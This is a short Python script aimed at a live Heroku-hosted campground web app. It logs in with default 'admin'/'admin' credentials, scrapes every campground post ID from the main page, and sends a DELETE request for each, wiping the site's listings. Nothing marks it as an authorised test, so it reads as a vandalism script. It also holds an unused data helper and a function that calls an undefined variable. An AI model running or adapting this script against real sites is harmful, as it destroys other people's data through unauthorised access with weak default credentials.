

import requests,string,random,re

def forumData():
    data = {
        'name': "bruh",
        'price': 69,
        'image': "https://i.ytimg.com/vi/wUAftsmzl9M/maxresdefault.jpg",
        'description': "lol",
    }
    return data
def name():
    return ''.join(random.choice(characters) for i in range(30))
r = requests.Session()

#login
r.post('https://salty-reef-80979.herokuapp.com/login',data={'username':'admin','password':'admin'})

#get posts
mainPage = r.get('https://salty-reef-80979.herokuapp.com/campgrounds')

ree = re.findall("<a href=\"/campgrounds/(.*)\" class=\"btn btn",mainPage.text)
for i in ree:
    r.post("https://salty-reef-80979.herokuapp.com/campgrounds/%s?_method=DELETE" % i)